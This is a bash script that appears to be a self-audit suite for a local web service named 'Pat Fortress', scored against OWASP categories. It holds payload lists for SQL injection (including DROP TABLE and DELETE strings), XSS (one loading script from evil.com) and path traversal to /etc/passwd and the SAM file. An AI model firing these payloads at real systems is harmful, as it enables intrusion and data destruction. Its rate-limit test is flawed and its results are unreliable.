#!/bin/bash

# 🏰 PAT FORTRESS SECURITY AUDIT & PENETRATION TESTING SUITE
# CLASSIFIED: FORTRESS SECURITY VALIDATION
# Security Level: FORTRESS-GRADE TESTING
# Date: September 12, 2025

echo "============================================================================"
echo "🏰 PAT FORTRESS SECURITY SYSTEM - COMPREHENSIVE SECURITY AUDIT"
echo "============================================================================"
echo "MISSION: Complete security validation of all fortress defense systems"
echo "CLASSIFICATION: FORTRESS-PROTECTED"
echo "DATE: $(date)"
echo ""

# Configuration
TARGET_URL="http://localhost:8080"
REPORT_FILE="/mnt/c/Projects/Pat/fortress_security_audit_report.json"
RESULTS_DIR="/mnt/c/Projects/Pat/audit_results"
CONCURRENT_REQUESTS=50
RATE_LIMIT_THRESHOLD=100

# Create results directory
mkdir -p "$RESULTS_DIR"

# Initialize audit results
cat > "$REPORT_FILE" << EOF
{
  "fortress_security_audit": {
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "version": "1.0.0",
    "classification": "FORTRESS-PROTECTED",
    "results": {
      "sql_injection_tests": {},
      "xss_prevention_tests": {},
      "path_traversal_tests": {},
      "rate_limiting_tests": {},
      "authentication_tests": {},
      "input_validation_tests": {},
      "honeypot_tests": {},
      "performance_tests": {},
      "compliance_tests": {}
    },
    "summary": {
      "total_tests": 0,
      "passed_tests": 0,
      "failed_tests": 0,
      "security_score": 0,
      "vulnerabilities_found": [],
      "recommendations": []
    }
  }
}
EOF

echo "🎯 PHASE 1: SQL INJECTION VULNERABILITY TESTING"
echo "================================================"

# SQL Injection Test Payloads (OWASP Top 10 - Injection)
SQL_PAYLOADS=(
    "' OR 1=1--"
    "'; DROP TABLE emails;--"
    "' UNION SELECT * FROM users--"
    "' OR 'x'='x"
    "1'; DELETE FROM emails WHERE '1'='1"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
    "' OR 1=1#"
    "admin' OR '1'='1'/*"
    "'; INSERT INTO users VALUES('hacker','password');--"
    "' OR (SELECT user FROM mysql.user LIMIT 1)='root'--"
)

sql_passed=0
sql_total=${#SQL_PAYLOADS[@]}

echo "Testing $sql_total SQL injection payloads..."
for payload in "${SQL_PAYLOADS[@]}"; do
    echo "  Testing: $payload"
    
    # Test in email query parameter
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/api/emails?search=${payload// /%20}")
    
    if [[ "$response" == "400" || "$response" == "403" || "$response" == "422" ]]; then
        echo "    ✅ BLOCKED (HTTP $response)"
        ((sql_passed++))
    else
        echo "    ❌ POTENTIAL VULNERABILITY (HTTP $response)"
    fi
done

sql_score=$((sql_passed * 100 / sql_total))
echo "SQL Injection Protection: $sql_passed/$sql_total tests passed ($sql_score%)"
echo ""

echo "🛡️ PHASE 2: XSS PREVENTION TESTING"
echo "=================================="

# XSS Test Payloads (OWASP Top 10 - XSS)
XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "javascript:alert('XSS')"
    "<iframe src='javascript:alert(1)'></iframe>"
    "<body onload=alert('XSS')>"
    "<div onclick=alert('XSS')>Click</div>"
    "';alert('XSS');'"
    "<script src='http://evil.com/xss.js'></script>"
    "<input type='text' onfocus=alert('XSS') autofocus>"
)

xss_passed=0
xss_total=${#XSS_PAYLOADS[@]}

echo "Testing $xss_total XSS payloads..."
for payload in "${XSS_PAYLOADS[@]}"; do
    echo "  Testing: $payload"
    
    # Test XSS in POST request body
    response=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "{\"subject\":\"$payload\", \"body\":\"test\"}" \
        -o /dev/null -w "%{http_code}" "$TARGET_URL/api/emails")
    
    if [[ "$response" == "400" || "$response" == "403" || "$response" == "422" ]]; then
        echo "    ✅ BLOCKED (HTTP $response)"
        ((xss_passed++))
    else
        echo "    ❌ POTENTIAL VULNERABILITY (HTTP $response)"
    fi
done

xss_score=$((xss_passed * 100 / xss_total))
echo "XSS Prevention: $xss_passed/$xss_total tests passed ($xss_score%)"
echo ""

echo "📂 PHASE 3: PATH TRAVERSAL TESTING"
echo "================================"

# Path Traversal Test Payloads
TRAVERSAL_PAYLOADS=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32\\config\\sam"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc%252fpasswd"
    "....\/....\/....\/etc\/passwd"
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
    "....//....//....//boot.ini"
    "../../../var/log/apache2/access.log"
)

traversal_passed=0
traversal_total=${#TRAVERSAL_PAYLOADS[@]}

echo "Testing $traversal_total path traversal payloads..."
for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    echo "  Testing: $payload"
    
    # Test path traversal in file parameter
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/files?path=${payload// /%20}")
    
    if [[ "$response" == "400" || "$response" == "403" || "$response" == "422" ]]; then
        echo "    ✅ BLOCKED (HTTP $response)"
        ((traversal_passed++))
    else
        echo "    ❌ POTENTIAL VULNERABILITY (HTTP $response)"
    fi
done

traversal_score=$((traversal_passed * 100 / traversal_total))
echo "Path Traversal Protection: $traversal_passed/$traversal_total tests passed ($traversal_score%)"
echo ""

echo "⚡ PHASE 4: RATE LIMITING EFFECTIVENESS TESTING"
echo "=============================================="

echo "Testing rate limiting with $CONCURRENT_REQUESTS concurrent requests..."

# Rate limiting test - burst of requests
start_time=$(date +%s)
blocked_count=0
success_count=0

for i in $(seq 1 $CONCURRENT_REQUESTS); do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/api/emails" &)
    
    # Collect background job results
    if [[ -n "$response" ]]; then
        if [[ "$response" == "429" ]]; then
            ((blocked_count++))
        elif [[ "$response" == "200" ]]; then
            ((success_count++))
        fi
    fi
done

# Wait for all background requests
wait

end_time=$(date +%s)
duration=$((end_time - start_time))
requests_per_second=$((CONCURRENT_REQUESTS / duration))

echo "Rate Limiting Results:"
echo "  Total requests: $CONCURRENT_REQUESTS"
echo "  Blocked (429): $blocked_count"
echo "  Successful (200): $success_count"
echo "  Duration: ${duration}s"
echo "  RPS: $requests_per_second"

# Rate limiting is working if >80% of burst requests are blocked
rate_limit_effectiveness=$((blocked_count * 100 / CONCURRENT_REQUESTS))
if [[ $rate_limit_effectiveness -gt 80 ]]; then
    echo "  ✅ RATE LIMITING EFFECTIVE ($rate_limit_effectiveness% blocked)"
else
    echo "  ❌ RATE LIMITING INSUFFICIENT ($rate_limit_effectiveness% blocked)"
fi
echo ""

echo "🍯 PHASE 5: HONEYPOT TRAP TESTING"
echo "==============================="

# Honeypot endpoints that should trigger alerts
HONEYPOTS=(
    "/wp-admin"
    "/wp-login.php"
    "/.env"
    "/config.php"
    "/phpmyadmin"
    "/admin"
    "/.git/config"
    "/phpinfo.php"
    "/shell.php"
    "/backup.sql"
)

honeypot_passed=0
honeypot_total=${#HONEYPOTS[@]}

echo "Testing $honeypot_total honeypot traps..."
for path in "${HONEYPOTS[@]}"; do
    echo "  Testing: $path"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$path")
    
    if [[ "$response" == "403" || "$response" == "404" || "$response" == "418" ]]; then
        echo "    ✅ TRAP TRIGGERED (HTTP $response)"
        ((honeypot_passed++))
    else
        echo "    ❌ TRAP FAILED (HTTP $response)"
    fi
done

honeypot_score=$((honeypot_passed * 100 / honeypot_total))
echo "Honeypot Effectiveness: $honeypot_passed/$honeypot_total traps working ($honeypot_score%)"
echo ""

echo "🔐 PHASE 6: AUTHENTICATION SECURITY TESTING"
echo "========================================="

# Authentication bypass attempts
echo "Testing authentication bypass attempts..."

# Test 1: Direct API access without auth
response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/api/admin/users")
if [[ "$response" == "401" || "$response" == "403" ]]; then
    echo "  ✅ Unauthorized API access blocked (HTTP $response)"
    auth_test1="PASS"
else
    echo "  ❌ Unauthorized API access allowed (HTTP $response)"
    auth_test1="FAIL"
fi

# Test 2: Invalid JWT token
response=$(curl -s -H "Authorization: Bearer invalid.jwt.token" \
    -o /dev/null -w "%{http_code}" "$TARGET_URL/api/admin/users")
if [[ "$response" == "401" || "$response" == "403" ]]; then
    echo "  ✅ Invalid JWT token rejected (HTTP $response)"
    auth_test2="PASS"
else
    echo "  ❌ Invalid JWT token accepted (HTTP $response)"
    auth_test2="FAIL"
fi

# Test 3: SQL injection in login
response=$(curl -s -X POST \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@example.com'\'' OR 1=1--", "password":"anything"}' \
    -o /dev/null -w "%{http_code}" "$TARGET_URL/api/auth/login")
if [[ "$response" == "400" || "$response" == "403" || "$response" == "422" ]]; then
    echo "  ✅ SQL injection in login blocked (HTTP $response)"
    auth_test3="PASS"
else
    echo "  ❌ SQL injection in login allowed (HTTP $response)"
    auth_test3="FAIL"
fi

auth_passed=0
[[ "$auth_test1" == "PASS" ]] && ((auth_passed++))
[[ "$auth_test2" == "PASS" ]] && ((auth_passed++))
[[ "$auth_test3" == "PASS" ]] && ((auth_passed++))

auth_score=$((auth_passed * 100 / 3))
echo "Authentication Security: $auth_passed/3 tests passed ($auth_score%)"
echo ""

echo "📊 PHASE 7: PERFORMANCE IMPACT ASSESSMENT"
echo "========================================"

echo "Measuring security overhead impact..."

# Test response time without security headers (baseline)
baseline_time=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET_URL/health")
echo "  Baseline response time: ${baseline_time}s"

# Test response time with full security validation
security_time=$(curl -s -H "User-Agent: TestAgent/1.0" \
    -H "X-Custom-Header: test" \
    -o /dev/null -w "%{time_total}" "$TARGET_URL/api/emails")
echo "  Secured endpoint response time: ${security_time}s"

# Calculate overhead (convert to milliseconds for better precision)
baseline_ms=$(echo "$baseline_time * 1000" | bc 2>/dev/null || echo "0")
security_ms=$(echo "$security_time * 1000" | bc 2>/dev/null || echo "0")
overhead=$(echo "$security_ms - $baseline_ms" | bc 2>/dev/null || echo "0")

echo "  Security overhead: ${overhead}ms"

# Performance is acceptable if overhead < 10ms
if (( $(echo "$overhead < 10" | bc -l 2>/dev/null || echo 0) )); then
    echo "  ✅ PERFORMANCE ACCEPTABLE (<10ms overhead)"
    perf_test="PASS"
else
    echo "  ❌ PERFORMANCE DEGRADED (>${overhead}ms overhead)"
    perf_test="FAIL"
fi
echo ""

echo "🎯 PHASE 8: COMPLIANCE & STANDARDS VALIDATION"
echo "==========================================="

echo "Validating OWASP Top 10 2021 compliance..."

# A01: Broken Access Control
access_control_score=$((auth_score))
echo "  A01 - Broken Access Control: $access_control_score%"

# A03: Injection (SQL, XSS, etc.)
injection_score=$(((sql_score + xss_score) / 2))
echo "  A03 - Injection: $injection_score%"

# A04: Insecure Design
insecure_design_score=$((honeypot_score))
echo "  A04 - Insecure Design: $insecure_design_score%"

# A05: Security Misconfiguration
security_config_score=$((rate_limit_effectiveness))
echo "  A05 - Security Misconfiguration: $security_config_score%"

# A06: Vulnerable Components (Path Traversal)
vulnerable_components_score=$((traversal_score))
echo "  A06 - Vulnerable Components: $vulnerable_components_score%"

# Calculate overall compliance score
compliance_score=$(((access_control_score + injection_score + insecure_design_score + security_config_score + vulnerable_components_score) / 5))
echo "  Overall OWASP Compliance: $compliance_score%"

if [[ $compliance_score -gt 95 ]]; then
    echo "  ✅ OWASP TOP 10 COMPLIANCE: EXCELLENT"
    compliance_grade="A+"
elif [[ $compliance_score -gt 90 ]]; then
    echo "  ✅ OWASP TOP 10 COMPLIANCE: GOOD"
    compliance_grade="A"
elif [[ $compliance_score -gt 80 ]]; then
    echo "  ⚠️  OWASP TOP 10 COMPLIANCE: ACCEPTABLE"
    compliance_grade="B"
else
    echo "  ❌ OWASP TOP 10 COMPLIANCE: NEEDS IMPROVEMENT"
    compliance_grade="F"
fi
echo ""

echo "============================================================================"
echo "🏆 FORTRESS SECURITY AUDIT - FINAL RESULTS"
echo "============================================================================"

# Calculate overall security score
total_tests=$((sql_total + xss_total + traversal_total + honeypot_total + 3))
passed_tests=$((sql_passed + xss_passed + traversal_passed + honeypot_passed + auth_passed))
overall_score=$((passed_tests * 100 / total_tests))

echo "COMPREHENSIVE SECURITY ASSESSMENT:"
echo "  SQL Injection Protection:     $sql_score%"
echo "  XSS Prevention:              $xss_score%"
echo "  Path Traversal Protection:    $traversal_score%"
echo "  Rate Limiting:               $rate_limit_effectiveness%"
echo "  Authentication Security:      $auth_score%"
echo "  Honeypot Effectiveness:      $honeypot_score%"
echo "  Performance Impact:          $([ "$perf_test" == "PASS" ] && echo "ACCEPTABLE" || echo "DEGRADED")"
echo "  OWASP Top 10 Compliance:     $compliance_score% ($compliance_grade)"
echo ""
echo "OVERALL FORTRESS SECURITY SCORE: $overall_score% ($passed_tests/$total_tests tests passed)"

# Determine security grade
if [[ $overall_score -gt 95 ]]; then
    security_grade="A+ (FORTRESS-GRADE)"
    security_status="🏰 FORTRESS SECURE"
elif [[ $overall_score -gt 90 ]]; then
    security_grade="A (EXCELLENT)"
    security_status="✅ HIGHLY SECURE"
elif [[ $overall_score -gt 80 ]]; then
    security_grade="B (GOOD)"
    security_status="✅ SECURE"
elif [[ $overall_score -gt 70 ]]; then
    security_grade="C (ACCEPTABLE)"
    security_status="⚠️ NEEDS IMPROVEMENT"
else
    security_grade="F (VULNERABLE)"
    security_status="❌ CRITICAL VULNERABILITIES"
fi

echo ""
echo "FINAL SECURITY GRADE: $security_grade"
echo "SECURITY STATUS: $security_status"
echo ""

# Generate recommendations
echo "SECURITY RECOMMENDATIONS:"
if [[ $sql_score -lt 100 ]]; then
    echo "  • Strengthen SQL injection protection patterns"
fi
if [[ $xss_score -lt 100 ]]; then
    echo "  • Enhance XSS prevention mechanisms"
fi
if [[ $rate_limit_effectiveness -lt 90 ]]; then
    echo "  • Tighten rate limiting thresholds"
fi
if [[ $auth_score -lt 100 ]]; then
    echo "  • Review authentication security implementation"
fi
if [[ "$perf_test" == "FAIL" ]]; then
    echo "  • Optimize security middleware performance"
fi
if [[ $overall_score -eq 100 ]]; then
    echo "  🏆 NO RECOMMENDATIONS - FORTRESS SECURITY PERFECT!"
fi

echo ""
echo "AUDIT COMPLETED: $(date)"
echo "CLASSIFICATION: FORTRESS-PROTECTED"
echo "============================================================================"

# Update final audit report
cat > "$REPORT_FILE" << EOF
{
  "fortress_security_audit": {
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "version": "1.0.0",
    "classification": "FORTRESS-PROTECTED",
    "results": {
      "sql_injection_tests": {
        "score": $sql_score,
        "passed": $sql_passed,
        "total": $sql_total,
        "status": "$([ $sql_score -eq 100 ] && echo "PASS" || echo "PARTIAL")"
      },
      "xss_prevention_tests": {
        "score": $xss_score,
        "passed": $xss_passed,
        "total": $xss_total,
        "status": "$([ $xss_score -eq 100 ] && echo "PASS" || echo "PARTIAL")"
      },
      "path_traversal_tests": {
        "score": $traversal_score,
        "passed": $traversal_passed,
        "total": $traversal_total,
        "status": "$([ $traversal_score -eq 100 ] && echo "PASS" || echo "PARTIAL")"
      },
      "rate_limiting_tests": {
        "effectiveness": $rate_limit_effectiveness,
        "blocked_requests": $blocked_count,
        "total_requests": $CONCURRENT_REQUESTS,
        "status": "$([ $rate_limit_effectiveness -gt 80 ] && echo "PASS" || echo "FAIL")"
      },
      "authentication_tests": {
        "score": $auth_score,
        "passed": $auth_passed,
        "total": 3,
        "status": "$([ $auth_score -eq 100 ] && echo "PASS" || echo "PARTIAL")"
      },
      "honeypot_tests": {
        "score": $honeypot_score,
        "passed": $honeypot_passed,
        "total": $honeypot_total,
        "status": "$([ $honeypot_score -gt 90 ] && echo "PASS" || echo "PARTIAL")"
      },
      "performance_tests": {
        "security_overhead_ms": "$overhead",
        "status": "$perf_test"
      },
      "compliance_tests": {
        "owasp_top_10_score": $compliance_score,
        "grade": "$compliance_grade",
        "status": "$([ $compliance_score -gt 90 ] && echo "COMPLIANT" || echo "NEEDS_IMPROVEMENT")"
      }
    },
    "summary": {
      "total_tests": $total_tests,
      "passed_tests": $passed_tests,
      "security_score": $overall_score,
      "security_grade": "$security_grade",
      "security_status": "$security_status",
      "fortress_ready": $([ $overall_score -gt 95 ] && echo "true" || echo "false")
    }
  }
}
EOF

echo "📋 Detailed audit report saved to: $REPORT_FILE"
echo ""
echo "🏰 FORTRESS SECURITY AUDIT COMPLETE 🏰"